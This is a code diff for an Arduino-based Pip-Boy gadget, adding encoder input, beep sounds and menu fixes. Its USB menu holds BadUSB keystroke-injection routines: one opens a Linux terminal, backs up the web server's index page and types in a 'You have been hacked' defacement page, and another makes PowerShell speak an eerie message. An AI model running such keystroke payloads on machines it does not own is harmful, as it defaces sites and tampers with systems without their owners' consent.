@@ -2,6 +2,15 @@
 
 #include "arrays.h"
 
+
+void bleep() {
+  for (int i = 0; i < 15; i++) {
+    radio.tone(i);
+  }
+  delay(10);
+  radio.noTone();
+}
+
 void plotData() {
   Sprites::drawSelfMasked(96, 18, sinewave, currentawaveframe);
   Sprites::drawSelfMasked(109, 18, sinewave, currentbwaveframe);
@@ -32,6 +41,29 @@ void animate() {
     }
   }
 }
+
+void handleEncoder() {
+  int newPosition = Enc.read() / 4;
+
+  int difference = (newPosition - oldPosition);
+  if (difference < 0) {
+    //clockwise
+    //counter++;
+    anticlockwise = false;
+    clockwise = true;
+  } else if (difference > 0) {
+    //anticlockwise
+    //counter--;
+    anticlockwise = true;
+    clockwise = false;
+  } else {
+    //no change
+    anticlockwise = false;
+    clockwise = false;
+  }
+
+  oldPosition = newPosition;
+}
 void startup() {
   //start animation, vault boy probably.
   Sprites::drawOverwrite(WIDTH / 2 - vaultboyWidth / 2, 0, vaultboy, currentframe);
@@ -42,6 +74,7 @@ void startup() {
   pipboy.print(F("32,000"));
   if (pipboy.justPressed(A_BUTTON)) {
     pipboy.digitalWriteRGB(RGB_OFF, RGB_OFF, RGB_OFF);
+    gamestate = 1;
   }
   if (startcounter == framecount * 3) {
     gamestate = 1;
@@ -49,6 +82,8 @@ void startup() {
 }
 
 void handleMainMenu() {
+
+  int newPos = Enc.read();
   if (mainMenu == INV) { //highlight INV
     pipboy.drawLine(0, 51, 35, 51);
     pipboy.drawLine(35, 51, 35, 64);
@@ -67,12 +102,14 @@ void handleMainMenu() {
     pipboy.drawLine(93, 51, 93, 64);
     pipboy.drawLine(93, 51, 128, 51);
   }
-  if (pipboy.justPressed(RIGHT_BUTTON) && mainMenu < 3) {
+
+  if (((clockwise) || pipboy.justPressed(RIGHT_BUTTON)) && mainMenu < 3) {
     ++mainMenu;
   }
-  if (pipboy.justPressed(LEFT_BUTTON) && mainMenu > 0) {
+  if (((anticlockwise) || pipboy.justPressed(LEFT_BUTTON)) && mainMenu > 0) {
     --mainMenu;
   }
+
 }
 void gamecontroller() {
   // Initialize Joystick Library
@@ -253,55 +290,55 @@ void USBattackL() {
   delay(5000);
   CommandAtRunBarGnome("gnome-terminal");
   delay(3000);
-  Keyboard.println("cd /var/www");
+  Keyboard.println(F("cd /var/www"));
   delay(2000);
-  Keyboard.println("mv index.* index.bak");
+  Keyboard.println(F("mv index.* index.bak"));
   delay(2000);
-  Keyboard.println("touch index.html");
+  Keyboard.println(F("touch index.html"));
   delay(2000);
-  Keyboard.println("nano index.html");
+  Keyboard.println(F("nano index.html"));
   delay(2000);
-  Keyboard.println("<marquee><h1>You have been hacked by the BadUSB Leonardo</h1></marquee>");
+  Keyboard.println(F("<marquee><h1>You have been hacked by the BadUSB Leonardo</h1></marquee>"));
   delay(2000);
-  Keyboard.println("<center><a href=\"http://www.usbrubberducky.com/\"><img src=\"http://cdn.shopify.com/s/files/1/0068/2142/products/usbducky2.jpg\" /></a><center>");
+  Keyboard.println(F("<center><a href=\"http://www.usbrubberducky.com/\"><img src=\"http://cdn.shopify.com/s/files/1/0068/2142/products/usbducky2.jpg\" /></a><center>"));
   delay(2000);
-  Keyboard.println("<center><h5>Your old index page can be found <a href=\"./index.bak\">here.</a></h5></center>");
+  Keyboard.println(F("<center><h5>Your old index page can be found <a href=\"./index.bak\">here.</a></h5></center>"));
   delay(2000);
   Keyboard.press(KEY_LEFT_CTRL);
   Keyboard.press('x');
   delay(100);
   Keyboard.releaseAll();
   delay(2000);
-  Keyboard.println("y");
+  Keyboard.println(F("y"));
   delay(3000);
-  Keyboard.println("exit");
+  Keyboard.println(F("exit"));
 }
 void USBattackW() {
   delay(5000);
   CommandAtRunBarMSWIN("powershell");
   delay(4000);
-  Keyboard.println("Add-Type -AssemblyName System.speech");
+  Keyboard.println(F("Add-Type -AssemblyName System.speech"));
   delay(2000);
-  Keyboard.println("$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer");
+  Keyboard.println(F("$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer"));
   delay(2000);
-  Keyboard.println("$speak.Speak(\"Where is my body? Oh. Oh, god no. Where are my eyes? Greyson, where are my eyes?\")");
+  Keyboard.println(F("$speak.Speak(\"Where is my body? Oh. Oh, god no. Where are my eyes? Greyson, where are my eyes?\")"));
   delay(2000);
-  Keyboard.println("exit");
+  Keyboard.println(F("exit"));
 }
 void lockwindows() {
   Keyboard.press(KEY_LEFT_GUI);
-  Keyboard.println("l");
+  Keyboard.println(F("l"));
   Keyboard.releaseAll();
 }
 void displaywindows() {
   Keyboard.press(KEY_LEFT_GUI);
-  Keyboard.println("d");
+  Keyboard.println(F("d"));
   Keyboard.releaseAll();
 }
 void openterminal() {
   Keyboard.press(KEY_LEFT_CTRL);
   Keyboard.press(KEY_LEFT_ALT);
-  Keyboard.println("t");
+  Keyboard.println(F("t"));
   Keyboard.releaseAll();
 }
 void subMenus() {
@@ -333,7 +370,7 @@ void subMenus() {
     pipboy.fillRect(INVcursorx, INVcursory, 4, 4);
   }
   if (mainMenu == MAP) {
-    pipboy.drawBitmap(0, 0, hmap, 128, 52);
+    pipboy.drawBitmap(0, -12, hmap, 128, 64);
   }
   if (mainMenu == USB) {
     pipboy.setCursor(0, 0);
@@ -369,22 +406,28 @@ void subMenus() {
     if (pipboy.justPressed(DOWN_BUTTON) && USBselect < 5) USBselect += 1;
     if (pipboy.justPressed(UP_BUTTON) && USBselect > 0) USBselect -= 1;
     if (pipboy.justPressed(A_BUTTON) && USBselect == 0) {
+      bleep();
       USBattackW();
     }
     if (pipboy.justPressed(A_BUTTON) && USBselect == 2) {  //hold all four directions to exit
       gamecontrolleropen = true;
+      bleep();
       gamestate = 2;
     }
     if (pipboy.justPressed(A_BUTTON) && USBselect == 1) {
+      bleep();
       USBattackL();
     }
     if (pipboy.justPressed(A_BUTTON) && USBselect == 3) {
+      bleep();
       lockwindows();
     }
     if (pipboy.justPressed(A_BUTTON) && USBselect == 4) {
+      bleep();
       displaywindows();
     }
     if (pipboy.justPressed(A_BUTTON) && USBselect == 5) {
+      bleep();
       openterminal();
     }
   }
@@ -480,6 +523,7 @@ void gameloop() {
 
     case 1:
       //user interface
+
       UI();
 
       break;
@@ -487,11 +531,12 @@ void gameloop() {
     case 2:
       gamecontroller();
       break;
+      
   }
 
-  if (pipboy.justPressed(B_BUTTON)) {
+  if (pipboy.justPressed(B_BUTTON) && gamestate != 2) {
+
     pipboy.digitalWriteRGB(RGB_ON, RGB_ON, RGB_ON);
   }
-
 
 }
